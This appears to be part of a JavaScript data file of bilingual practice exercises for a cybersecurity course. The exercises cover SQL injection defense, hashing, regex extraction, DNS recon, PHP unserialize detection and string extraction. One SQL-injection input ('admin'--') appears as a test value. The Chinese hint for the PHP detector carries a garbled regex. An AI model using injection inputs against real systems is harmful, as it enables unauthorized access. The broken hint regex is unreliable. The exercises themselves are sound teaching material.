    "hint": "先将每个 Base64 字符映射为 0-63 的值（查表），将 4 个 6 位值合并为 3 个 8 位字节。注意处理 padding (=)。",
    "hintEn": "Map Base64 chars to 0-63 values, merge 4 6-bit values into 3 8-bit bytes. Handle padding.",
    "test": "my_base64_decode",
    "starter": "def my_base64_decode(s):\n    # 你的代码\n    pass\n\nprint(my_base64_decode('SGVsbG8='))  # 应输出 b'Hello'",
    "starterEn": "def my_base64_decode(s):\n    # Your code\n    pass\n\nprint(my_base64_decode('SGVsbG8='))  # Should output b'Hello'",
    "expected": "b'Hello'"
  },
  {
    "id": "prac-04",
    "title": "SQL 注入防护",
    "titleEn": "SQL Injection Defense",
    "category": "Web安全",
    "categoryEn": "Web Security",
    "difficulty": 2,
    "lang": "Python",
    "question": "以下是一个不安全的 SQL 查询函数。请将其改写为使用参数化查询的安全版本。输入 username 和 password，返回 True/False 表示认证是否成功。使用 sqlite3 模块。",
    "questionEn": "Rewrite an insecure SQL query using parameterized queries. Accept username/password, return True/False. Use sqlite3.",
    "hint": "使用 cursor.execute('SELECT ... WHERE username=? AND password=?', (user, pwd)) 的占位符语法。",
    "hintEn": "Use cursor.execute('SELECT ... WHERE username=? AND password=?', (user, pwd)).",
    "test": "safe_login",
    "starter": "import sqlite3\n\n# 假设数据库已有 users 表\nconn = sqlite3.connect(':memory:')\nconn.execute('CREATE TABLE users(username TEXT, password TEXT)')\nconn.execute(\"INSERT INTO users VALUES('admin','s3cr3t')\")\n\ndef safe_login(username, password):\n    # 使用参数化查询\n    pass\n\nprint(safe_login('admin', 's3cr3t'))       # True\nprint(safe_login(\"admin'--\", 'anything'))  # False (阻止注入)",
    "starterEn": "import sqlite3\n\n# Assume users table exists\nconn = sqlite3.connect(':memory:')\nconn.execute('CREATE TABLE users(username TEXT, password TEXT)')\nconn.execute(\"INSERT INTO users VALUES('admin','s3cr3t')\")\n\ndef safe_login(username, password):\n    # Use parameterized queries\n    pass\n\nprint(safe_login('admin', 's3cr3t'))       # True\nprint(safe_login(\"admin'--\", 'anything'))  # False (block injection)",
    "expected": "True\nFalse"
  },
  {
    "id": "prac-05",
    "title": "C 指针实战",
    "titleEn": "C Pointer Practice",
    "category": "编程基础",
    "categoryEn": "Programming",
    "difficulty": 2,
    "lang": "C",
    "question": "编写一个函数 swap(int *a, int *b)，交换两个整数的值。然后写出一个函数 reverse_array(int *arr, int len)，利用 swap 函数反转数组。验证：数组 [1,2,3,4,5] 反转后为 [5,4,3,2,1]。",
    "questionEn": "Write swap(int *a, int *b) and reverse_array(int *arr, int len). Verify: [1,2,3,4,5] → [5,4,3,2,1].",
    "hint": "swap 中需要用临时变量暂存 *a 的值；reverse_array 中交换 arr[i] 和 arr[len-1-i]。",
    "hintEn": "Use temp variable in swap; swap arr[i] and arr[len-1-i] in reverse_array.",
    "test": "reverse_array",
    "starter": "#include <stdio.h>\n\nvoid swap(int *a, int *b) {\n    // 你的代码\n}\n\nvoid reverse_array(int *arr, int len) {\n    // 你的代码\n}\n\nint main() {\n    int arr[] = {1,2,3,4,5};\n    reverse_array(arr, 5);\n    for(int i=0;i<5;i++) printf(\"%d \", arr[i]);\n    return 0;\n}",
    "starterEn": "#include <stdio.h>\n\nvoid swap(int *a, int *b) {\n    // Your code\n}\n\nvoid reverse_array(int *arr, int len) {\n    // Your code\n}\n\nint main() {\n    int arr[] = {1,2,3,4,5};\n    reverse_array(arr, 5);\n    for(int i=0;i<5;i++) printf(\"%d \", arr[i]);\n    return 0;\n}",
    "expected": "5 4 3 2 1"
  },
  {
    "id": "prac-06",
    "title": "SHA-256 哈希验证",
    "titleEn": "SHA-256 Hash Verification",
    "category": "密码学",
    "categoryEn": "Cryptography",
    "difficulty": 1,
    "lang": "Python",
    "question": "编写函数 verify_hash(filename, expected_hash)，计算文件的 SHA-256 值并与期望值比较。这是下载 Kali ISO 等安全软件后的标准验证流程。提示：分块读取文件避免大文件一次性加载到内存。",
    "questionEn": "Write verify_hash(filename, expected_hash) to compute file SHA-256 and compare. Read in chunks for large files.",
    "hint": "使用 hashlib.sha256() + 分块读取（chunk=4096）。",
    "hintEn": "Use hashlib.sha256() with chunk reading (chunk=4096).",
    "test": "verify_hash",
    "starter": "import hashlib\n\ndef verify_hash(filename, expected_hash):\n    # 你的代码（返回 True 表示匹配，False 表示不匹配或文件不存在）\n    pass\n\nfrom tempfile import TemporaryDirectory\nfrom pathlib import Path\nwith TemporaryDirectory() as directory:\n    sample = Path(directory) / 'test.txt'\n    sample.write_bytes(b'hello')\n    print(verify_hash(sample, hashlib.sha256(b'hello').hexdigest()))\n    print(verify_hash(sample, '0' * 64))",
    "starterEn": "import hashlib\n\ndef verify_hash(filename, expected_hash):\n    # Your code (return True if match, False if no match or file not found)\n    pass\n\nfrom tempfile import TemporaryDirectory\nfrom pathlib import Path\nwith TemporaryDirectory() as directory:\n    sample = Path(directory) / 'test.txt'\n    sample.write_bytes(b'hello')\n    print(verify_hash(sample, hashlib.sha256(b'hello').hexdigest()))\n    print(verify_hash(sample, '0' * 64))",
    "expected": "True\nFalse"
  },
  {
    "id": "prac-07",
    "title": "正则匹配提取",
    "titleEn": "Regex URL/Email Extraction",
    "category": "编程基础",
    "categoryEn": "Programming",
    "difficulty": 2,
    "lang": "Python",
    "question": "编写函数 extract_urls(text)，从一段文本中提取所有 URL（http/https）。URL 可能包含端口号和路径。同时编写 extract_email(text) 提取所有邮箱地址。",
    "questionEn": "Write extract_urls(text) for HTTP(S) URLs and extract_email(text) for email addresses. URLs may have ports and paths.",
    "hint": "URL 正则：https?://[\\w.-]+(?::\\d+)?(?:/[\\w./?=&%-]*)?；邮箱正则：[\\w.+-]+@[\\w-]+\\.[\\w.]+。用 re.findall。",
    "hintEn": "URL: https?://[\\w.-]+(?::\\d+)?(?:/[\\w./?=&%-]*)? ; Email: [\\w.+-]+@[\\w-]+\\.[\\w.]+",
    "test": "extract_urls",
    "starter": "import re\n\ndef extract_urls(text):\n    # 返回 URL 列表\n    pass\n\ndef extract_emails(text):\n    # 返回邮箱列表\n    pass\n\nsample = \"Visit https://example.com:8080/path or email admin@cyberedu.com\"\nprint(extract_urls(sample))\nprint(extract_emails(sample))",
    "starterEn": "import re\n\ndef extract_urls(text):\n    # Return URL list\n    pass\n\ndef extract_emails(text):\n    # Return email list\n    pass\n\nsample = \"Visit https://example.com:8080/path or email admin@cyberedu.com\"\nprint(extract_urls(sample))\nprint(extract_emails(sample))",
    "expected": "['https://example.com:8080/path']\n['admin@cyberedu.com']"
  },
  {
    "id": "prac-08",
    "title": "DNS 解析查询",
    "titleEn": "DNS Lookup Query",
    "category": "网络",
    "categoryEn": "Networking",
    "difficulty": 2,
    "lang": "Python",
    "question": "编写函数 dns_lookup(domain)，返回该域名的所有 A 记录（IPv4）和 MX 记录（邮件服务器）。这是渗透测试中信息收集的常用操作——了解目标的 DNS 配置可以发现子域名和邮件基础设施。",
    "questionEn": "Write dns_lookup(domain) returning A records and MX records. Common recon in pentesting.",
    "hint": "使用 socket.getaddrinfo() 获取 A 记录；MX 记录需要 dns.resolver 模块（pip install dnspython）。",
    "hintEn": "socket.getaddrinfo() for A records; dns.resolver for MX (pip install dnspython).",
    "test": "dns_lookup",
    "starter": "import socket\n\ndef dns_lookup(domain):\n    a_records = []  # IPv4 地址列表\n    mx_records = []  # 邮件服务器列表\n    # 你的代码\n    return {'A': a_records, 'MX': mx_records}\n\nresult = dns_lookup('example.com')\nprint(result)",
    "starterEn": "import socket\n\ndef dns_lookup(domain):\n    a_records = []  # IPv4 addresses\n    mx_records = []  # Mail servers\n    # Your code\n    return {'A': a_records, 'MX': mx_records}\n\nresult = dns_lookup('example.com')\nprint(result)",
    "expected": null
  },
  {
    "id": "prac-09",
    "title": "PHP 反序列化检测",
    "titleEn": "PHP Deserialization Detection",
    "category": "Web安全",
    "categoryEn": "Web Security",
    "difficulty": 3,
    "lang": "Python",
    "questionEn": "Write detect_unserialize_risk(php_code) to find dangerous unserialize() calls on user input (superglobals). Return line numbers.",
    "hintEn": "Regex: r'unserialize\\s*\\(\\s*(\\$_(?:GET|POST|REQUEST|COOKIE)[^)]*)\\)'",
    "question": "编写函数 detect_unserialize_risk(php_code)，扫描 PHP 代码中所有使用 unserialize() 的位置，检查是否对用户可控数据直接反序列化。返回所有危险调用点的列表（行号和代码片段）。",
    "hint": "用正则 r'unserializes*(\\s*(\\$_(?:GET|POST|REQUEST|COOKIE)[^)]*)\\)' 匹配对超全局变量的直接反序列化。",
    "test": "detect_unserialize_risk",
    "starter": "import re\n\ndef detect_unserialize_risk(php_code):\n    risks = []\n    # 你的代码\n    return risks\n\ncode = '''<?php\n$obj = unserialize($_GET['data']);\n$safe = unserialize(file_get_contents('config.dat'));\n?>'''\nfor risk in detect_unserialize_risk(code):\n    print(risk['line'])",
    "starterEn": "import re\n\ndef detect_unserialize_risk(php_code):\n    risks = []\n    # Your code\n    return risks\n\ncode = '''<?php\n$obj = unserialize($_GET['data']);\n$safe = unserialize(file_get_contents('config.dat'));\n?>'''\nfor risk in detect_unserialize_risk(code):\n    print(risk['line'])",
    "expected": "2"
  },
  {
    "id": "prac-10",
    "title": "逆向基础：字符串提取",
    "titleEn": "Reverse: String Extraction",
    "category": "逆向工程",
    "categoryEn": "Reverse Engineering",
    "difficulty": 2,
    "lang": "Python",
    "questionEn": "Write extract_strings(filepath, min_len=4) simulating Linux strings: extract consecutive printable ASCII strings from binary files.",
    "hintEn": "Read byte by byte, check 0x20-0x7E range. Consecutive printable chars form a string.",
    "question": "编写函数 extract_strings(filepath, min_len=4)，模拟 Linux strings 命令的基础功能：从二进制文件中提取长度 >= min_len 的连续可打印 ASCII 字符串。这是逆向分析的第一步——快速发现硬编码的 URL、文件名和密钥。",
    "hint": "逐字节读取文件，判断字节是否在可打印 ASCII 范围（0x20~0x7E），连续的可打印字符组成字符串。",
    "test": "extract_strings",
    "starter": "def extract_strings(filepath, min_len=4):\n    strings_found = []\n    # 你的代码\n    return strings_found\n\nfrom tempfile import TemporaryDirectory\nfrom pathlib import Path\nwith TemporaryDirectory() as directory:\n    sample = Path(directory) / 'sample.bin'\n    sample.write_bytes(b'\\x00CYBER\\xffEDU!\\x00')\n    for text in extract_strings(sample):\n        print(text)",
    "starterEn": "def extract_strings(filepath, min_len=4):\n    strings_found = []\n    # Your code\n    return strings_found\n\nfrom tempfile import TemporaryDirectory\nfrom pathlib import Path\nwith TemporaryDirectory() as directory:\n    sample = Path(directory) / 'sample.bin'\n    sample.write_bytes(b'\\x00CYBER\\xffEDU!\\x00')\n    for text in extract_strings(sample):\n        print(text)",
    "expected": "CYBER\nEDU!"
  }
];

if (typeof module !== 'undefined' && module.exports) {
  for (const mod of MODULES) for (const lang of ['zh', 'en']) {
    registerLessonPack(lang, require('./lessons/' + mod.id + '.' + lang + '.js'));
  }
  module.exports = {
    injectGlossary,
    SECTION_CONTENT,
    SECTION_CONTENT_EN,
    GLOSSARY,
    MODULES,
    CTF_CHALLENGES,
    PRACTICES,
    SECTION_CHECKPOINTS,
    SECTION_CHECKPOINTS_EN
  };
}
